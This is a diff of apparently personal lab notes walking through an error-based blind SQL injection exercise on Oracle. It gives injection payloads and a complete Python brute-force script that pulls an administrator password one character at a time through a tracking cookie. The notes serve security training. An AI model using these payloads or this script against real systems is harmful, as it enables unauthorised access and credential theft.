@@ -38,4 +38,73 @@ length(password)>$ we fuzz that statement and check the output, as we can see th
 
 Enumerating username/password position character in oracle
 
-`'||(select case when substr(username,1,1)='§a§' then to_char(1/0) else '' end from users where username='administrator'||'`
+USERNAME
+
+`'||(select case when substr(username,1,1)='b' then to_char(1/0) else '' end from users where username='administrator')||'`
+
+PASSWORD
+
+`'||(select case when substr(password,1,1)='fuzzing' then to_char(1/0) else '' end from users where username='administrator')||'`
+
+In this case the first field of the 20 characters password is "i" cause during the fuzzing attack it was the only character that return an error
+
+<figure><img src="../../../.gitbook/assets/sql-oracle-password-first-position.png" alt=""><figcaption></figcaption></figure>
+
+Creating a regex to add a column HTTP status (From Intruder)
+
+<div>
+
+<figure><img src="../../../.gitbook/assets/fetch-1.png" alt=""><figcaption></figcaption></figure>
+
+ 
+
+<figure><img src="../../../.gitbook/assets/fetch-2.png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+Attacking using cluster bomb
+
+In the cluster bomb attack the main difference is that we select two variables to modify so for this context we can fuzz in the password from 0-9 and in character from 0-9 and A-Z (This case we know that password doesn't have symbols cause its a practice scenario).
+
+<figure><img src="../../../.gitbook/assets/cluster-bomb-1.png" alt=""><figcaption></figcaption></figure>
+
+Python script for sql injection error status
+
+```
+from pwn import *
+import requests,signal,time,pdb,sys,string
+
+def def_handler(sig, frame):
+    print("*\n\n [!] Saliendo...\n")
+    sys.exit()
+
+#ctrl+c
+
+signal.signal(signal.SIGINT, def_handler)
+
+main_url = "https://0a0100f6038fd3cc8220061d00df00c4.web-security-academy.net"
+characters = string.ascii_lowercase + string.digits
+
+def makeRequest():
+    password = ""
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+    time.sleep(2)
+    p2 = log.progress("Password")
+
+    for position in range(1,21):
+        for character in characters:
+            cookies = {
+                'TrackingId': "PCys85TEo6qFVYqY'||(select case when substr(password,%d,1)='%c' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
+                'session': 'wP97ksPRh3hrzHmHOSaSEb0LRzo5kLON'
+            }
+            p1.status(cookies['TrackingId'])
+            r = requests.get(main_url, cookies = cookies)
+
+            if r.status_code == 500:  ###We put error status here
+                password += character
+                p2.status(password)
+                break
+makeRequest()
+```
+
